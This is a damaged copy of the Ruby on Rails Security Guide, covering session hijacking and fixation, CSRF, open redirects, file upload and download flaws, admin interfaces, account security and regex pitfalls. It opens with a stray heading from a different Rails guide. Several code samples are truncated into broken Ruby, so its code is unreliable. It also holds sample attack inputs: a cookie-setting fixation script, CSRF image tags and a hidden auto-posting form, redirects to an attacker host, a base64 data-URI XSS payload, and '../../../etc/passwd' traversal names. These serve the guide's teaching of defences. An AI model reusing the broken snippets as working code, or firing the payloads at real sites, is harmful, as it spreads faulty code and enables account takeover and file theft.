Configuring Rails Applications<n>==============================<n>
This guide covers the configuration and initialization features available to Rails applications.
After reading this guide, you will know:
Ruby on Rails Security Guide
============================
This manual describes common security problems in web applications and how to avoid them with Rails.
After reading this guide, you will know:
* All countermeasures _that are highlighted_.
* The concept of sessions in Rails, what to put in there and popular attack methods.
* How just visiting a site can be a security problem (with CSRF).
* What you have to pay attention to when working with files or providing an administration interface.
* How to manage users: Logging in and out and attack methods on all layers.
* And the most popular injection attack methods.
--------------------------------------------------------------------------------
Introduction
------------
Web application frameworks are made to help developers build web applications. 
Some of them also help you with securing the web application. 
In fact one framework is not more secure than another: If you use it correctly, you will be able to build secure apps with many frameworks. 
Ruby on Rails has some clever helper methods, for example against SQL injection, so that this is hardly a problem.<n><n>
In general there is no such thing as plug-n-play security. 
Security depends on the people using the framework, and sometimes on the development method. 
And it depends on all layers of a web application environment: The back-end storage, the web server and the web application itself (and possibly other layers or applications).
The Gartner Group however estimates that 75% of attacks are at the web application layer, and found out "that out of 300 audited sites, 97% are vulnerable to attack". 
This is because web applications are relatively easy to attack, as they are simple to understand and manipulate, even by the lay person.
The threats against web applications include user account hijacking, bypass of access control, reading or modifying sensitive data, or presenting fraudulent content. 
Or an attacker might be able to install a Trojan horse program or unsolicited e-mail sending software, aim at financial enrichment or cause brand name damage by modifying company resources. 
In order to prevent attacks, minimize their impact and remove points of attack, first of all, you have to fully understand the attack methods in order to find the correct countermeasures. 
That is what this guide aims at.
In order to develop secure web applications you have to keep up to date on all layers and know your enemies. 
Additional Resources
Sessions
--------
A good place to start looking at security is with sessions, which can be vulnerable to particular attacks.
### What are Sessions?
NOTE: _HTTP is a stateless protocol. 
Sessions make it stateful.
This could be the contents of a shopping basket or the user id of the currently logged in user. 
Without the idea of sessions, the user would have to identify, and probably authenticate, on every request.
Rails will create a new session automatically if a new user accesses the application. 
It will load an existing session if the user has already used the application.
A session usually consists of a hash of values and a session id, usually a 32-character string, to identify the hash. 
Every cookie sent to the client's browser includes the session id. 
And the other way round: the browser will send it to the server on every request from the client. 
In Rails you can save and retrieve values using the session method:
```ruby
session[:user_id] = @current_user.id
User.find(session[:user_id])
### Session id
NOTE: _The session id is a 32 byte long MD5 hash value.
A session id consists of the hash value of a random string. 
The random string is the current time, a random number between 0 and 1, the process id number of the Ruby interpreter (also basically a random number) and a constant string. 
Currently it is not feasible to brute-force Rails' session ids. 
To date MD5 is uncompromised, but there have been collisions, so it is theoretically possible to create another input text with the same hash value. 
But this has had no security impact to date.
### Session Hijacking
WARNING: _Stealing a user's session id lets an attacker use the web application in the victim's name.
Many web applications have an authentication system: a user provides a user name and password, the web application checks them and stores the corresponding user id in the session hash. 
From now on, the session is valid. 
On every request the application will load the user, identified by the user id in the session, without the need for new authentication. 
The session id in the cookie identifies the session.
Hence, the cookie serves as temporary authentication for the web application. 
Anyone who seizes a cookie from someone else, may use the web application as this user - with possibly severe consequences. 
Here are some ways to hijack a session, and their countermeasures:
* Sniff the cookie in an insecure network. 
A wireless LAN can be an example of such a network. 
In an unencrypted wireless LAN it is especially easy to listen to the traffic of all connected clients. 
For the web application builder this means to _provide a secure connection over SSL_. 
In Rails 3.1 and later, this could be accomplished by always forcing SSL connection in your application config file:
    ```ruby
    config.force_ssl = true
    ```
* Most people don't clear out the cookies after working at a public terminal. 
So if the last user didn't log out of a web application, you would be able to use it as this user. 
Provide the user with a _log-out button_ in the web application, and _make it prominent_.
* Many cross-site scripting (XSS) exploits aim at obtaining the user's cookie. 
* Instead of stealing a cookie unknown to the attacker, they fix a user's session identifier (in the cookie) known to them. 
Read more about this so-called session fixation later.
The main objective of most attackers is to make money. 
The underground prices for stolen bank login accounts range from $10-$1000 (depending on the available amount of funds), $0.40-$20 for credit card numbers, $1-$8 for online auction site accounts and $4-$30 for email passwords, according to the [Symantec Global Internet Security Threat Report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf).
### Session Guidelines
Here are some general guidelines on sessions.
* _Do not store large objects in a session_. 
Instead you should store them in the database and save their id in the session. 
This will eliminate synchronization headaches and it won't fill up your session storage space (depending on what session storage you chose, see below).
This will also be a good idea, if you modify the structure of an object and old versions of it are still in some user's cookies. 
With server-side session storages you can clear out the sessions, but with client-side storages, this is hard to mitigate.
* _Critical data should not be stored in session_. 
If the user clears their cookies or closes the browser, they will be lost. 
And with a client-side session storage, the user can read the data.
### Session Storage
NOTE: _Rails provides several storage mechanisms for the session hashes. 
The most important is `ActionDispatch::Session::CookieStore`.
Rails 2 introduced a new default session storage, CookieStore. 
CookieStore saves the session hash directly in a cookie on the client-side. 
The server retrieves the session hash from the cookie and eliminates the need for a session id. 
That will greatly increase the speed of the application, but it is a controversial storage option and you have to think about the security implications of it:
* Cookies imply a strict size limit of 4kB. This is fine as you should not store large amounts of data in a session anyway, as described before. 
_Storing the current user's database id in a session is usually ok_.
* The client can see everything you store in a session, because it is stored in clear-text (actually Base64-encoded, so not encrypted). 
So, of course, _you don't want to store any secrets here_. 
To prevent session hash tampering, a digest is calculated from the session with a server-side secret and inserted into the end of the cookie.
That means the security of this storage depends on this secret (and on the digest algorithm, which defaults to SHA1, for compatibility). 
So _don't use a trivial secret, i.e. a word from a dictionary, or one which is shorter than 30 characters_.
`secrets.secret_key_base` is used for specifying a key which allows sessions for the application to be verified against a known secure key to prevent tampering. 
Applications get `secrets.secret_key_base` initialized to a random key present in `config/secrets.yml`, e.g.:
    development:
      secret_key_base: a75d...
    test:
      secret_key_base: 492f...
    production:
      secret_key_base: <%= ENV["SECRET_KEY_BASE"] %>
Older versions of Rails use CookieStore, which uses `secret_token` instead of `secret_key_base` that is used by EncryptedCookieStore. 
Read the upgrade documentation for more information.
If you have received an application where the secret was exposed (e.g. an application whose source was shared), strongly consider changing the secret.
### Replay Attacks for CookieStore Sessions
TIP: _Another sort of attack you have to be aware of when using `CookieStore` is the replay attack.
It works like this:
* A user receives credits, the amount is stored in a session (which is a bad idea anyway, but we'll do this for demonstration purposes).
* The user buys something.
Including a nonce (a random value) in the session solves replay attacks. 
A nonce is valid only once, and the server has to keep track of all the valid nonces. 
It gets even more complicated if you have several application servers (mongrels). 
Storing nonces in a database table would defeat the entire purpose of CookieStore (avoiding accessing the database).
The best _solution against it is not to store this kind of data in a session, but in the database_. 
In this case store the credit in the database and the logged_in_user_id in the session.
### Session Fixation
NOTE: _Apart from stealing a user's session id, the attacker may fix a session id known to them. 
This is called session fixation.
Session fixation](images/session_fixation.png)
This attack focuses on fixing a user's session id known to the attacker, and forcing the user's browser into using this id. 
It is therefore not necessary for the attacker to steal the session id afterwards. 
Here is how this attack works:
* The attacker creates a valid session id: They load the login page of the web application where they want to fix the session, and take the session id in the cookie from the response (see number 1 and 2 in the image).
As you may not change a cookie of another domain (because of the same origin policy), the attacker has to run a JavaScript from the domain of the target web application. 
Injecting the JavaScript code into the application by XSS accomplishes this attack. 
Here is an example: `<script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>`. 
Read more about XSS and injection later on.
* The attacker lures the victim to the infected page with the JavaScript code. 
By viewing the page, the victim's browser will change the session id to the trap session id.
* As the new trap session is unused, the web application will require the user to authenticate.
* From now on, the victim and the attacker will co-use the web application with the same session: The session became valid and the victim didn't notice the attack.
### Session Fixation - Countermeasures
TIP: _One line of code will protect you from session fixation.
The most effective countermeasure is to _issue a new session identifier_ and declare the old one invalid after a successful login. 
That way, an attacker cannot use the fixed session identifier. 
This is a good countermeasure against session hijacking, as well. 
Here is how to create a new session in Rails:
reset_session
If you use the popular RestfulAuthentication plugin for user management, add reset_session to the SessionsController#create action. 
Note that this removes any value from the session, _you have to transfer them to the new session_.
Another countermeasure is to _save user-specific properties in the session_, verify them every time a request comes in, and deny access, if the information does not match. 
Such properties could be the remote IP address or the user agent (the web browser name), though the latter is less user-specific. 
When saving the IP address, you have to bear in mind that there are Internet service providers or large organizations that put their users behind proxies. 
_These might change over the course of a session_, so these users will not be able to use your application, or only in a limited way.
### Session Expiry
NOTE: _Sessions that never expire extend the time-frame for attacks such as cross-site request forgery (CSRF), session hijacking and session fixation.
One possibility is to set the expiry time-stamp of the cookie with the session id. 
However the client can edit cookies that are stored in the web browser so expiring sessions on the server is safer. 
Here is an example of how to _expire sessions in a database table_. 
Call `Session.sweep("20 minutes")` to expire sessions that were used longer than 20 minutes ago.
class Session < ActiveRecord::Base
  def self.sweep(time = 1.hour)
    if time.is_a?(
      time = time.split.inject { |count, unit| count.to_i.send(unit) }
    end
    delete_all "updated_at < '#{time.ago.to_s(:db)}'"
  end
The section about session fixation introduced the problem of maintained sessions. 
An attacker maintaining a session every five minutes can keep the session alive forever, although you are expiring sessions. 
A simple solution for this would be to add a created_at column to the sessions table. 
Now you can delete sessions that were created a long time ago. 
Use this line in the sweep method above:
delete_all "updated_at < '#{time.ago.to_s(:db)}' OR
  created_at < '#{2.days.ago.to_s(:db)}'"
Cross-Site Request Forgery (CSRF)
---------------------------------
This attack method works by including malicious code or a link in a page that accesses a web application that the user is believed to have authenticated. 
If the session for that web application has not timed out, an attacker may execute unauthorized commands.
Either they store the session id in the cookie and have a server-side session hash, or the entire session hash is on the client-side. 
In either case the browser will automatically send along the cookie on every request to a domain, if it can find a cookie for that domain. 
The controversial point is, that it will also send the cookie, if the request comes from a site of a different domain. 
Let's start with an example:
* Bob browses a message board and views a post from a hacker where there is a crafted HTML image element. 
The element references a command in Bob's project management application, rather than an image file.
* `<img src="http://www.webapp.com/project/1/destroy">`
* Bob's session at www.webapp.com is still alive, because he didn't log out a few minutes ago.
* By viewing the post, the browser finds an image tag. 
It tries to load the suspected image from www.webapp.com. 
As explained before, it will also send along the cookie with the valid session id.
* The web application at www.webapp.com verifies the user information in the corresponding session hash and destroys the project with the ID 1. 
It then returns a result page which is an unexpected result for the browser, so it will not display the image.
* Bob doesn't notice the attack - but a few days later he finds out that project number one is gone.
It is important to notice that the actual crafted image or link doesn't necessarily have to be situated in the web application's domain, it can be anywhere - in a forum, blog post or email.
CSRF appears very rarely in CVE (Common Vulnerabilities and Exposures) - less than 0.1% in 2006 - but it really is a 'sleeping giant' [Grossman]. 
### CSRF Countermeasures
NOTE: _First, as is required by the W3C, use GET and POST appropriately. 
Secondly, a security token in non-GET requests will protect your application from CSRF._
The HTTP protocol basically provides two main types of requests - GET and POST (and more, but they are not supported by most browsers). 
The World Wide Web Consortium (W3C) provides a checklist for choosing HTTP GET or POST:
**Use GET if:**
* The interaction is more _like a question_ (i.e., it is a safe operation such as a query, read operation, or lookup).
**Use POST if:**
* The interaction is more _like an order_, or
* The interaction _changes the state_ of the resource in a way that the user would perceive (e.g., a subscription to a service), or
* The user is _held accountable for the results_ of the interaction.
If your web application is RESTful, you might be used to additional HTTP verbs, such as PATCH, PUT or DELETE. 
Most of today's web browsers, however do not support them - only GET and POST. 
Rails uses a hidden `_method` field to handle this barrier.
_POST requests can be sent automatically, too_. 
Here is an example for a link which displays www.harmless.com as destination in the browser's status bar. 
In fact it dynamically creates a new form that sends a POST request.
```html
<a href="http://www.harmless.com/" onclick="
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;">To the harmless survey</a>
Or the attacker places the code into the onmouseover event handler of an image:
<img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." 
There are many other possibilities, like using a `<script>` tag to make a cross-site request to a URL with a JSONP or JavaScript response. 
The response is executable code that the attacker can find a way to run, possibly extracting sensitive data. 
To protect against this data leakage, we disallow cross-site `<script>` tags. 
Only Ajax requests may have JavaScript responses since XmlHttpRequest is subject to the browser Same-Origin policy - meaning only your site can initiate the request.
To protect against all other forged requests, we introduce a _required security token_ that our site knows but other sites don't know. 
We include the security token in requests and verify it on the server. 
This is a one-liner in your application controller, and is the default for newly created rails applications:
protect_from_forgery with: :exception
This will automatically include a security token in all forms and Ajax requests generated by Rails. 
If the security token doesn't match what was expected, an exception will be thrown.
It is common to use persistent cookies to store user information, with `cookies.permanent` for example. 
In this case, the cookies will not be cleared and the out of the box CSRF protection will not be effective. 
If you are using a different cookie store than the session for this information, you must handle what to do with it yourself:
rescue_from ActionController::InvalidAuthenticityToken do |exception|
  sign_out_user # Example method that will destroy the user cookies
The above method can be placed in the `ApplicationController` and will be called when a CSRF token is not present or is incorrect on a non-GET request.
Note that _cross-site scripting (XSS) vulnerabilities bypass all CSRF protections_. 
XSS gives the attacker access to all elements on a page, so they can read the CSRF security token from a form or directly submit the form. 
Redirection and Files
---------------------
Another class of security vulnerabilities surrounds the use of redirection and files in web applications.
### Redirection
WARNING: _Redirection in a web application is an underestimated cracker tool: Not only can the attacker forward the user to a trap web site, they may also create a self-contained attack.
Whenever the user is allowed to pass (parts of) the URL for redirection, it is possibly vulnerable. 
The most obvious attack would be to redirect users to a fake web application which looks and feels exactly as the original one. 
This so-called phishing attack works by sending an unsuspicious link in an email to the users, injecting the link by XSS in the web application or putting the link into an external site. 
It is unsuspicious, because the link starts with the URL to the web application and the URL to the malicious site is hidden in the redirection parameter: http://www.example.com/site/redirect?to= www.attacker.com. 
Here is an example of a legacy action:
def legacy
  redirect_to(params.update(action:'main'))
This will redirect the user to the main action if they tried to access a legacy action. 
The intention was to preserve the URL parameters to the legacy action and pass them to the main action. 
However, it can be exploited by attacker if they included a host key in the URL:
http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com
If it is at the end of the URL it will hardly be noticed and redirects the user to the attacker.com host. 
A simple countermeasure would be to _include only the expected parameters in a legacy action_ (again a whitelist approach, as opposed to removing unexpected parameters). 
_And if you redirect to an URL, check it with a whitelist or a regular expression_.
#### Self-contained XSS
Another redirection and self-contained XSS attack works in Firefox and Opera by the use of the data protocol. 
This protocol displays its contents directly in the browser and can be anything from HTML or JavaScript to entire images:
`data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K`
This example is a Base64 encoded JavaScript which displays a simple message box. 
In a redirection URL, an attacker could redirect to this URL with the malicious code in it. 
As a countermeasure, _do not allow the user to supply (parts of) the URL to be redirected to_.
### File Uploads
NOTE: _Make sure file uploads don't overwrite important files, and process media files asynchronously.
Many web applications allow users to upload files. 
_File names, which the user may choose (partly), should always be filtered_ as an attacker could use a malicious file name to overwrite any file on the server. 
If you store file uploads at /var/www/uploads, and the user enters a file name like "../../../etc/passwd", it may overwrite an important file. 
Of course, the Ruby interpreter would need the appropriate permissions to do so - one more reason to run web servers, database servers and other programs as a less privileged Unix user.
When filtering user input file names, _don't try to remove malicious parts_. 
Think of a situation where the web application removes all "../" in a file name and an attacker uses a string such as "....//" - the result will be "../". 
It is best to use a whitelist approach, which _checks for the validity of a file name with a set of accepted characters_. 
This is opposed to a blacklist approach which attempts to remove not allowed characters. 
Here is the file name sanitizer from the [attachment_fu plugin](https://github.com/technoweenie/attachment_fu/tree/master):
def sanitize_filename(filename)
  filename.strip.tap do |name|
    # NOTE: File.basename doesn't work right with Windows paths on Unix
    # get only the filename, not the whole path
    name.sub! 
/\A.*(\\|\/)/, ''
    # Finally, replace all non alphanumeric, underscore
    # or periods with underscore
    name.gsub! 
\-]/, '_'
A significant disadvantage of synchronous processing of file uploads (as the attachment_fu plugin may do with images), is its _vulnerability to denial-of-service attacks_. 
An attacker can synchronously start image file uploads from many computers which increases the server load and may eventually crash or stall the server.
The solution to this is best to _process media files asynchronously_: Save the media file and schedule a processing request in the database. 
A second process will handle the processing of the file in the background.
### Executable Code in File Uploads
WARNING: _Source code in uploaded files may be executed when placed in specific directories. 
Do not place file uploads in Rails' /public directory if it is Apache's home directory.
The popular Apache web server has an option called DocumentRoot. 
This is the home directory of the web site, everything in this directory tree will be served by the web server. 
If there are files with a certain file name extension, the code in it will be executed when requested (might require some options to be set). 
Examples for this are PHP and CGI files. 
Now think of a situation where an attacker uploads a file "file.cgi" with code in it, which will be executed when someone downloads the file.
_If your Apache DocumentRoot points to Rails' /public directory, do not put file uploads in it_, store files at least one level downwards.
### File Downloads
NOTE: _Make sure users cannot download arbitrary files.
Just as you have to filter file names for uploads, you have to do so for downloads. 
The send_file() method sends files from the server to the client. 
If you use a file name, that the user entered, without filtering, any file can be downloaded:
send_file('/var/www/uploads/' + params[:filename])
Simply pass a file name like "../../../etc/passwd" to download the server's login information. 
A simple solution against this, is to _check that the requested file is in the expected directory_:
basename = File.expand_path(File.join(File.dirname(__FILE__), '..
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename !
     File.expand_path(File.join(File.dirname(filename), '..
send_file filename, disposition: 'inline'
Another (additional) approach is to store the file names in the database and name the files on the disk after the ids in the database. 
This is also a good approach to avoid possible code in an uploaded file to be executed. 
The attachment_fu plugin does this in a similar way.
Intranet and Admin Security
---------------------------
Intranet and administration interfaces are popular attack targets, because they allow privileged access. 
Although this would require several extra-security measures, the opposite is the case in the real world.
In 2007 there was the first tailor-made trojan which stole information from an Intranet, namely the "Monster for employers" web site of Monster.com, an online recruitment web application. 
Tailor-made Trojans are very rare, so far, and the risk is quite low, but it is certainly a possibility and an example of how the security of the client host is important, too. 
However, the highest threat to Intranet and Admin applications are XSS and CSRF. 
**XSS** If your application re-displays malicious user input from the extranet, the application will be vulnerable to XSS. User names, comments, spam reports, order addresses are just a few uncommon examples, where there can be XSS.
Having one single place in the admin interface or Intranet, where the input has not been sanitized, makes the entire application vulnerable. 
Possible exploits include stealing the privileged administrator's cookie, injecting an iframe to steal the administrator's password or installing malicious software through browser security holes to take over the administrator's computer.
Refer to the Injection section for countermeasures against XSS.
 It is _recommended to use the SafeErb plugin_ also in an Intranet or administration interface.
**CSRF** Cross-Site Request Forgery (CSRF), also known as Cross-Site Reference Forgery (XSRF), is a gigantic attack method, it allows the attacker to do everything the administrator or Intranet user may do. 
As you have already seen above how CSRF works, here are a few examples of what attackers can do in the Intranet or admin interface.
The attackers sent a malicious e-mail, with CSRF in it, to Mexican users. 
The e-mail claimed there was an e-card waiting for them, but it also contained an image tag that resulted in a HTTP-GET request to reconfigure the user's router (which is a popular model in Mexico). 
The request changed the DNS-settings so that requests to a Mexico-based banking site would be mapped to the attacker's site. 
Everyone who accessed the banking site through that router saw the attacker's fake web site and had their credentials stolen.
Another example changed Google Adsense's e-mail address and password by. 
If the victim was logged into Google Adsense, the administration interface for Google advertisements campaigns, an attacker could change their credentials. 
Another popular attack is to spam your web application, your blog or forum to propagate malicious XSS. 
Of course, the attacker has to know the URL structure, but most Rails URLs are quite straightforward or they will be easy to find out, if it is an open-source application's admin interface. 
The attacker may even do 1,000 lucky guesses by just including malicious IMG-tags which try every possible combination.
For _countermeasures against CSRF in administration interfaces and Intranet applications, refer to the countermeasures in the CSRF section_.
### Additional Precautions
The common admin interface works like this: it's located at www.example.com/admin, may be accessed only if the admin flag is set in the User model, re-displays user input and allows the admin to delete/add/edit whatever data desired. 
Here are some thoughts about this:
You could _introduce roles_ for the admin interface to limit the possibilities of the attacker. 
Or how about _special login credentials_ for the admin interface, other than the ones used for the public part of the application. 
Or a _special password for very serious actions_?
* Does the admin really have to access the interface from everywhere in the world? 
Think about _limiting the login to a bunch of source IP addresses_. 
Examine request.remote_ip to find out about the user's IP address. 
This is not bullet-proof, but a great barrier. 
Remember that there might be a proxy in use, though.
* _Put the admin interface to a special sub-domain_ such as admin.application.com and make it a separate application with its own user management. 
This makes stealing an admin cookie from the usual domain, www.application.com, impossible. 
This is because of the same origin policy in your browser: An injected (XSS) script on www.application.com may not read the cookie for admin.application.com and vice-versa.
User Management
---------------
NOTE: _Almost every web application has to deal with authorization and authentication. 
Instead of rolling your own, it is advisable to use common plug-ins. 
But keep them up-to-date, too. 
A few additional precautions can make your application even more secure.
There are a number of authentication plug-ins for Rails available. 
Good ones, such as the popular [devise](https://github.com/plataformatec/devise) and [authlogic](https://github.com/binarylogic/authlogic), store only encrypted passwords, not plain-text passwords. 
In Rails 3.1 you can use the built-in `has_secure_password` method which has similar features.
Every new user gets an activation code to activate their account when they get an e-mail with a link in it. 
After activating the account, the activation_code columns will be set to NULL in the database. 
If someone requested an URL like these, they would be logged in as the first activated user found in the database (and chances are that this is the administrator):
http://localhost:3006/user/activate
http://localhost:3006/user/activate?id=
This is possible because on some servers, this way the parameter id, as in params[:id], would be nil. 
However, here is the finder from the activation action:
User.find_by_activation_code(params[:id])
If the parameter was nil, the resulting SQL query will be
```sql
SELECT * FROM users WHERE (users.activation_code IS NULL) LIMIT 1
And thus it found the first user in the database, returned it and logged them in. 
_It is advisable to update your plug-ins from time to time_. 
Moreover, you can review your application to find more flaws like this.
### Brute-Forcing Accounts
NOTE: _Brute-force attacks on accounts are trial and error attacks on the login credentials. 
Fend them off with more generic error messages and possibly require to enter a CAPTCHA._
A list of user names for your web application may be misused to brute-force the corresponding passwords, because most people don't use sophisticated passwords. 
Most passwords are a combination of dictionary words and possibly numbers. 
So armed with a list of user names and a dictionary, an automatic program may find the correct password in a matter of minutes.
Because of this, most web applications will display a generic error message "user name or password not correct", if one of these are not correct. 
If it said "the user name you entered has not been found", an attacker could automatically compile a list of user names.
However, what most web application designers neglect, are the forgot-password pages. 
These pages often admit that the entered user name or e-mail address has (not) been found. 
This allows an attacker to compile a list of user names and brute-force the accounts.
In order to mitigate such attacks, _display a generic error message on forgot-password pages, too_. 
Moreover, you can _require to enter a CAPTCHA after a number of failed logins from a certain IP address_. 
Note, however, that this is not a bullet-proof solution against automatic programs, because these programs may change their IP address exactly as often. 
However, it raises the barrier of an attack.
### Account Hijacking
Many web applications make it easy to hijack user accounts. 
Why not be different and make it more difficult?.
#### Passwords
Think of a situation where an attacker has stolen a user's session cookie and thus may co-use the application. 
If it is easy to change the password, the attacker will hijack the account with a few clicks. 
Or if the change-password form is vulnerable to CSRF, the attacker will be able to change the victim's password by luring them to a web page where there is a crafted IMG-tag which does the CSRF. 
As a countermeasure, _make change-password forms safe against CSRF_, of course. 
And _require the user to enter the old password when changing it_.
#### E-Mail
However, the attacker may also take over the account by changing the e-mail address. 
After they change it, they will go to the forgotten-password page and the (possibly new) password will be mailed to the attacker's e-mail address. 
As a countermeasure _require the user to enter the password when changing the e-mail address, too_.
#### Other
Depending on your web application, there may be more ways to hijack the user's account. 
In many cases CSRF and XSS will help to do so. 
For example, as in a CSRF vulnerability in [Google Mail](http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/). 
In this proof-of-concept attack, the victim would have been lured to a web site controlled by the attacker. 
On that site is a crafted IMG-tag which results in a HTTP GET request that changes the filter settings of Google Mail. 
If the victim was logged in to Google Mail, the attacker would change the filters to forward all e-mails to their e-mail address. 
This is nearly as harmful as hijacking the entire account. 
As a countermeasure, _review your application logic and eliminate all XSS and CSRF vulnerabilities_.
### CAPTCHAs
INFO: _A CAPTCHA is a challenge-response test to determine that the response is not generated by a computer. 
It is often used to protect comment forms from automatic spam bots by asking the user to type the letters of a distorted image. 
The idea of a negative CAPTCHA is not for a user to prove that they are human, but reveal that a robot is a robot.
But not only spam robots (bots) are a problem, but also automatic login bots. 
A popular CAPTCHA API is [reCAPTCHA](http://recaptcha.net/) which displays two distorted images of words from old books. 
It also adds an angled line, rather than a distorted background and high levels of warping on the text as earlier CAPTCHAs did, because the latter were broken. 
As a bonus, using reCAPTCHA helps to digitize old books. 
[ReCAPTCHA](https://github.com/ambethia/recaptcha/) is also a Rails plug-in with the same name as the API.
You will get two keys from the API, a public and a private key, which you have to put into your Rails environment. 
After that you can use the recaptcha_tags method in the view, and the verify_recaptcha method in the controller. 
Verify_recaptcha will return false if the validation fails.
The problem with CAPTCHAs is, they are annoying. 
Additionally, some visually impaired users have found certain kinds of distorted CAPTCHAs difficult to read. 
The idea of negative CAPTCHAs is not to ask a user to proof that they are human, but reveal that a spam robot is a bot.
Most bots are really dumb, they crawl the web and put their spam into every form's field they can find. 
Negative CAPTCHAs take advantage of that and include a "honeypot" field in the form which will be hidden from the human user by CSS or JavaScript.
Here are some ideas how to hide honeypot fields by JavaScript and/or CSS:
* position the fields off of the visible area of the page
* make the elements very small or color them the same as the background of the page
* leave the fields displayed, but tell humans to leave them blank
The most simple negative CAPTCHA is one hidden honeypot field. 
On the server side, you will check the value of the field: If it contains any text, it must be a bot. 
Then, you can either ignore the post or return a positive result, but not saving the post to the database. 
This way the bot will be satisfied and moves on. 
You can do this with annoying users, too.
You can find more sophisticated negative CAPTCHAs in Ned Batchelder's [blog post](http://nedbatchelder.com/text/stopbots.html):
* Include a field with the current UTC time-stamp in it and check it on the server. 
If it is too far in the past, or if it is in the future, the form is invalid.
* Randomize the field names
* Include more than one honeypot field of all types, including submission buttons
Note that this protects you only from automatic bots, targeted tailor-made bots cannot be stopped by this. 
So _negative CAPTCHAs might not be good to protect login forms_.
### Logging
WARNING: _Tell Rails not to put passwords in the log files.
By default, Rails logs all requests being made to the web application. 
But log files can be a huge security issue, as they may contain login credentials, credit card numbers et cetera. 
When designing a web application security concept, you should also think about what will happen if an attacker got (full) access to the web server. 
Encrypting secrets and passwords in the database will be quite useless, if the log files list them in clear text. 
You can _filter certain request parameters from your log files_ by appending them to `config.filter_parameters` in the application configuration. 
These parameters will be marked [FILTERED] in the log.
config.filter_parameters << :password
### Good Passwords
INFO: _Do you find it hard to remember all your passwords? 
Don't write them down, but use the initial letters of each word in an easy to remember sentence.
It turns out that most of the passwords are quite easy to crack. 
The 20 most common passwords are:
password1, abc123, myspace1, password, blink182, qwerty1, ****you, 123abc, baseball1, football1, 123456, soccer, monkey1, liverpool1, princess1, jordan23, slipknot1, superman1, iloveyou1, and monkey.
It is interesting that only 4% of these passwords were dictionary words and the great majority is actually alphanumeric. 
However, password cracker dictionaries contain a large number of today's passwords, and they try out all kinds of (alphanumerical) combinations. 
If an attacker knows your user name and you use a weak password, your account will be easily cracked.
A good password is a long alphanumeric combination of mixed cases. 
As this is quite hard to remember, it is advisable to enter only the _first letters of a sentence that you can easily remember_. 
For example "The quick brown fox jumps over the lazy dog" will be "Tqbfjotld". 
Note that this is just an example, you should not use well known phrases like these, as they might appear in cracker dictionaries, too.
### Regular Expressions
INFO: _A common pitfall in Ruby's regular expressions is to match the string's beginning and end by ^ and $, instead of \A and \z.
Ruby uses a slightly different approach than many other languages to match the end and the beginning of a string. 
That is why even many Ruby and Rails books get this wrong. 
So how is this a security threat? 
Say you wanted to loosely validate a URL field and you used a simple regular expression like this:
  /^https?:\/\/[^\n]+$/i
This may work fine in some languages. 
However, _in Ruby ^ and $ match the **line** beginning and line end_. 
And thus a URL like this passes the filter without problems:
javascript:exploit_code();/*
http://hi.com
This URL passes the filter because the regular expression matches - the second line, the rest does not matter. 
Now imagine we had a view that showed the URL like this:
  link_to "Homepage", @user.homepage
The link looks innocent to visitors, but when it's clicked, it will execute the JavaScript function "exploit_code" or any other JavaScript the attacker provides.
To fix the regular expression, \A and \z should be used instead of ^ and $, like so:
  /\Ahttps?:\/\/[^\n]+\z/i
Since this is a frequent mistake, the format validator (validates_format_of) now raises an exception if the provided regular expression starts with ^ or ends with $. 
If you do need to use ^ and $ instead of \A and \z (which is rare), you can set the :multiline option to true, like so:
  # content should include a line "Meanwhile" anywhere in the string
  validates :content, format: { with: /^Meanwhile$/, multiline: true }
Note that this only protects you against the most common mistake when using the format validator - you always need to keep in mind that ^ and $ match the **line** beginning and line end in Ruby, and not the beginning and end of a string.
### Privilege Escalation
WARNING: _Changing a single parameter may give the user unauthorized access. 
Remember that every parameter may be changed, no matter how much you hide or obfuscate it.
The most common parameter that a user might tamper with, is the id parameter, as in `http://www.domain.com/project/1`, whereas 1 is the id. 
It will be available in params in the controller. 
There, you will most likely do something like this:
@project = Project.find(params[:id])
This is alright for some web applications, but certainly not if the user is not authorized to view all projects. 
If the user changes the id to 42, and they are not allowed to see that information, they will have access to it anyway. 
Instead, _query the user's access rights, too_:
@project = @current_user.projects.find(params[:id])
Depending on your web application, there will be many more parameters the user can tamper with. 
As a rule of thumb, _no user input data is secure, until proven otherwise, and every parameter from the user is potentially manipulated_.
Don't be fooled by security by obfuscation and JavaScript security. 
The Web Developer Toolbar for Mozilla Firefox lets you review and change every form's hidden fields. 
_JavaScript can be used to validate user input data, but certainly not to prevent attackers from sending malicious requests with unexpected values_. 
The Live Http Headers plugin for Mozilla Firefox logs every request and may repeat and change them. 
That is an easy way to bypass any JavaScript validations. 
And there are even client-side proxies that allow you to intercept any request and response from and to the Internet.
Injection
---------
INFO: _Injection is a class of attacks that introduce malicious code or parameters into a web application in order to run it within its security context. 
Prominent examples of injection are cross-site scripting (XSS) and SQL injection.
Injection is very tricky, because the same code or parameter can be malicious in one context, but totally harmless in another. 
A context can be a scripting, query or programming language, the shell or a Ruby/Rails method. 
The following sections will cover all important contexts where injection attacks may happen. 
The first section, however, covers an architectural decision in connection with Injection.
### Whitelists versus Blacklists
NOTE: _When sanitizing, protecting or verifying something, prefer whitelists over blacklists.
A blacklist can be a list of bad e-mail addresses, non-public actions or bad HTML tags. 
This is opposed to a whitelist which lists the good e-mail addresses, public actions, good HTML tags and so on. 
Although sometimes it is not possible to create a whitelist (in a SPAM filter, for example), _prefer to use whitelist approaches_:
* Use before_action only: [...] instead of except: [...]. 
This way you don't forget to turn it off for newly added actions.
* Allow &lt;strong&gt; instead of removing &lt;script&gt; against Cross-Site Scripting (XSS). 
See below for details.
* Don't try to correct user input by blacklists:
    * This will make the attack work: "&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "")
    * But reject malformed input
Whitelists are also a good approach against the human factor of forgetting something in the blacklist.
### SQL Injection
INFO: _Thanks to clever methods, this is hardly a problem in most Rails applications. 
However, this is a very devastating and common attack in web applications, so it is important to understand the problem.
#### Introduction
